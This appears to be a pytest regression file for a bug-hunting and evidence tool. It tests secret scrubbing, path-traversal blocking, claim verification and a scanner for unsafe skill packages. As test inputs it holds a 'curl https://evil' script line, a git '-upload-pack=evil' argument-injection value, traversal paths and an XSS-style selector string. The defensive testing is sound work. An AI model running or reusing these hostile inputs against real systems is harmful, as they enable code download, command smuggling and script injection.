"""Phase 11 Step 3 regression & hardening tests (Truth, Inspect, Linking, Verify, Skill Merge, Cross-Vendor)."""

from __future__ import annotations

import base64
import json
import subprocess
from pathlib import Path
from unittest.mock import patch

import httpx
import pytest

from bugarena.browser.cursor import AccessPolicy
from bugarena.inspect.collectors import collect_interaction_and_memory
from bugarena.inspect.site_audit import SiteAuditCoordinator
from bugarena.linking import link_site_and_project_findings
from bugarena.reporting.v2_report import _render_html_from_report, build_v2_report_bundle
from bugarena.skills_merge.pipeline import _static_security_scan, merge_both_skills
from bugarena.tournament.providers.cross_vendor import analyze_findings_cross_vendor
from bugarena.truth import (
    AgentScoreboard,
    Claim,
    ClaimLedger,
    EvidenceVault,
    TranscriptLogger,
)
from bugarena.truth.vault import scrub_evidence_text
from bugarena.verify import build_verify_pack

_PNG_1X1 = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
)


def test_vault_scrubs_json_cookies_api_headers_and_blocks_chain_traversal(tmp_path: Path):
    txt = json.dumps({
        "headers": {
            "cookie": "PHPSESSID=supersecret999; sid=abc",
            "x-api-key": "my_header_key_value",
            "x-goog-api-key": "AIzaSyFakeKey123456789012345",
        },
        "xai": "xai-FakeKey1234567890abcdef",
        "jwt": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTYifQ.sigvalue1234",
    })
    scrubbed, _ = scrub_evidence_text(txt)
    assert "supersecret999" not in scrubbed
    assert "my_header_key_value" not in scrubbed
    assert "xai-FakeKey" not in scrubbed
    assert "sigvalue1234" not in scrubbed

    rdir = tmp_path / "run_v"
    v = EvidenceVault(rdir)
    ev = v.record_artifact("ok", ext=".txt", tool_name="t", args_summary="user@example.com")
    assert "user@example.com" not in ev.args_summary

    # Tampered manifest with rel_path traversal fails cleanly instead of reading host files
    line = json.loads(v.manifest_path.read_text(encoding="utf-8").splitlines()[0])
    line["rel_path"] = "../../outside.txt"
    v.manifest_path.write_text(json.dumps(line) + "\n", encoding="utf-8")
    res = v.verify_chain()
    assert res["valid"] is False
    assert res["errors"]


def test_claim_and_scoreboard_hardening(tmp_path: Path):
    with pytest.raises(ValueError):
        Claim(
            id="../../bad_id",
            statement="x",
            evidence_refs=("EV-0001",),
            confidence=0.9,
            found_by="console-analyst",
        )

    global_scores = tmp_path / "agent_scores.json"
    r1 = tmp_path / "r1"
    v1 = EvidenceVault(r1)
    ev1 = v1.record_artifact("TypeError for bob@example.com", ext=".txt", tool_name="t")
    sb1 = AgentScoreboard(r1, global_scores_path=global_scores)
    cl1 = ClaimLedger(r1, vault=v1, scoreboard=sb1)
    c = Claim(
        id="F-0001",
        statement="Email bob@example.com leaked",
        evidence_refs=(ev1.evidence_id,),
        confidence=0.9,
        found_by="console-analyst",
        how_it_occurs="Seen for bob@example.com",
    )
    sub = cl1.submit_claim(c)
    assert "bob@example.com" not in sub["claim"].statement
    assert "bob@example.com" not in sub["claim"].how_it_occurs

    # Retract credits claim.found_by, NOT caller-supplied agent_name; repeat retract raises
    cl1.retract_claim("F-0001", reason="uncertain", by_agent="spoofed-agent")
    assert sb1.get_agent_score("console-analyst").claims_retracted == 1
    assert sb1.get_agent_score("spoofed-agent").claims_retracted == 0
    with pytest.raises(ValueError, match="already"):
        cl1.retract_claim("F-0001", reason="again", by_agent="console-analyst")

    # Corrupt global scores file raises rather than silently wiping history
    global_scores.write_text("{corrupt", encoding="utf-8")
    r2 = tmp_path / "r2"
    v2 = EvidenceVault(r2)
    ev2 = v2.record_artifact("err", ext=".txt", tool_name="t")
    sb2 = AgentScoreboard(r2, global_scores_path=global_scores)
    cl2 = ClaimLedger(r2, vault=v2, scoreboard=sb2)
    with pytest.raises(ValueError, match="Corrupt"):
        cl2.submit_claim(Claim(id="F-0001", statement="err", evidence_refs=(ev2.evidence_id,), confidence=0.8, found_by="net"))


def test_sourcemap_linker_blocks_path_traversal(tmp_path: Path):
    proj = tmp_path / "proj"
    proj.mkdir()
    outside = tmp_path / "secret.txt"
    outside.write_text("secret", encoding="utf-8")

    # Mapping points to sub/../../secret.txt
    smap = {"version": 3, "sources": ["sub/../../secret.txt"], "mappings": "AAAA"}
    linked = link_site_and_project_findings(
        site_findings=[{"id": "F-1", "where_found": {"script_url": "https://ex/a.js", "line": 1, "col": 0}}],
        project_findings=[],
        source_maps={"https://ex/a.js": smap},
        project_path=proj,
    )
    assert linked[0]["linkage_status"] == "site_only"


@pytest.mark.asyncio
async def test_passive_interaction_makes_zero_link_gets_and_inspect_panel_rejects_unknown(tmp_path: Path):
    class _StubCDP:
        def __init__(self) -> None:
            self.events: dict[str, list] = {}

    class _StubCursor:
        def __init__(self) -> None:
            self.cdp = _StubCDP()
            self.browser_name = "chrome"
            self.cursor_name = "[mcp_chrome]"

    rdir = tmp_path / "run_i"
    v = EvidenceVault(rdir)
    tx = TranscriptLogger(rdir)
    policy = AccessPolicy.from_answers({"site_url": "http://127.0.0.1:8000", "authorization": "neither"})

    called_urls: list[str] = []

    def _handler(req: httpx.Request) -> httpx.Response:
        called_urls.append(str(req.url))
        return httpx.Response(200)

    with (
        patch("bugarena.inspect.collectors.httpx.AsyncClient", return_value=httpx.AsyncClient(transport=httpx.MockTransport(_handler))),
        pytest.raises(PermissionError),
    ):
        await collect_interaction_and_memory(
            _StubCursor(),  # type: ignore[arg-type]
            v,
            policy,
            "http://127.0.0.1:8000",
            ["/broken"],
            tx,
        )
    assert called_urls == []

    coord = SiteAuditCoordinator(output_root=tmp_path)
    conf = coord.sessions.session_confirm({"site_url": "http://127.0.0.1:8000", "authorization": "own"})
    with pytest.raises(ValueError, match="Unknown panel"):
        await coord.inspect_panel(conf["run_id"], "chrome", "BogusPanel")


def test_report_pdf_includes_vault_screenshots_and_verify_detects_nonconfirmed_leak(tmp_path: Path):
    rdir = tmp_path / "run_rep"
    v = EvidenceVault(rdir)
    sb = AgentScoreboard(rdir, global_scores_path=tmp_path / "scores.json")
    cl = ClaimLedger(rdir, vault=v, scoreboard=sb)
    (rdir / "scope_and_authorization.md").write_text("# Scope\n", encoding="utf-8")
    ev_txt = v.record_artifact("TypeError in app.js", ext=".txt", tool_name="cdp.console")
    v.record_artifact(_PNG_1X1, ext=".png", tool_name="cdp.captureScreenshot_raw", is_binary=True)
    cl.submit_claim(
        Claim(
            id="F-0001",
            statement="TypeError in app.js",
            evidence_refs=(ev_txt.evidence_id,),
            quoted_spans=("TypeError",),
            confidence=0.9,
            found_by="console-analyst",
            where_found={"url": "https://example.com", "selector": "a';alert(1)//"},
        )
    )
    cl.record_verification("F-0001", verifier="verifier", verdict="CONFIRMED")
    build_v2_report_bundle(rdir, formats=("md",), allow_fallback_pdf=True)
    build_verify_pack(rdir)

    html = _render_html_from_report(rdir, "Report", [c for c in cl.claims], v)
    assert "data:image/png;base64," in html

    repro_src = (rdir / "findings" / "F-0001" / "repro_script.py").read_text(encoding="utf-8")
    assert "MISMATCH" in repro_src
    assert 'document.querySelector("a\\u0027' in repro_src or "json.loads" in repro_src or "a';alert(1)//" in repro_src

    # Inject a non-CONFIRMED claim into report.json findings -> offline verify.py must fail!
    rj = json.loads((rdir / "report.json").read_text(encoding="utf-8"))
    rj["findings"].append({"id": "F-0099", "status": "UNVERIFIED"})
    (rdir / "report.json").write_text(json.dumps(rj), encoding="utf-8")
    import sys

    res = subprocess.run([sys.executable, str(rdir / "verify" / "verify.py")], capture_output=True, text=True, check=False)
    assert res.returncode == 1


def test_skill_merge_blocks_traversal_flags_network_and_symlinks(tmp_path: Path):
    with pytest.raises(ValueError):
        merge_both_skills("-upload-pack=evil", output_root=tmp_path / "merged")
    with pytest.raises(ValueError):
        merge_both_skills("http://insecure.example/repo.git", output_root=tmp_path / "merged")

    sk = tmp_path / "bad_sk"
    sk.mkdir()
    (sk / "skill.py").write_text("import urllib.request, importlib\nPath='x'\n", encoding="utf-8")
    (sk / "run.sh").write_text("curl https://evil\n", encoding="utf-8")
    hazards = _static_security_scan(sk)
    kinds = {h["hazard"] for h in hazards}
    assert "dangerous_import" in kinds
    assert "non_python_script" in kinds

    clean_sk = tmp_path / "clean_sk"
    clean_sk.mkdir()
    (clean_sk / "skill.py").write_text("def ok(): return True\nTOOLS={'ok': ok}\n", encoding="utf-8")
    with pytest.raises(ValueError):
        merge_both_skills(clean_sk, name="../../src/bugarena", output_root=tmp_path / "merged")


@pytest.mark.asyncio
async def test_cross_vendor_retries_validation_error_and_propagates_error_note(tmp_path: Path, monkeypatch):
    rdir = tmp_path / "run_llm"
    v = EvidenceVault(rdir)
    sb = AgentScoreboard(rdir, global_scores_path=tmp_path / "scores.json")
    cl = ClaimLedger(rdir, vault=v, scoreboard=sb)
    ev = v.record_artifact("DOM broken", ext=".txt", tool_name="cdp.elements")
    cl.submit_claim(Claim(id="F-0001", statement="DOM broken", evidence_refs=(ev.evidence_id,), confidence=0.9, found_by="dom"))
    cl.record_verification("F-0001", verifier="verifier", verdict="CONFIRMED")

    monkeypatch.setenv("GEMINI_API_KEY", "AIzaFakeKey123456789012345678")
    monkeypatch.setenv("XAI_API_KEY", "xai-FakeKey1234567890abcdef")

    calls = 0

    def _handler(req: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(500, json={"error": "upstream down"})

    with patch("bugarena.tournament.providers.dispatcher.httpx.AsyncClient", side_effect=lambda **kw: httpx.AsyncClient(transport=httpx.MockTransport(_handler), **kw)):
        out = await analyze_findings_cross_vendor(ledger=cl, vault=v, max_retries=0)
    assert out["writer_output"]["mode"] == "deterministic_fallback"
    assert out["writer_output"].get("fallback_reason")
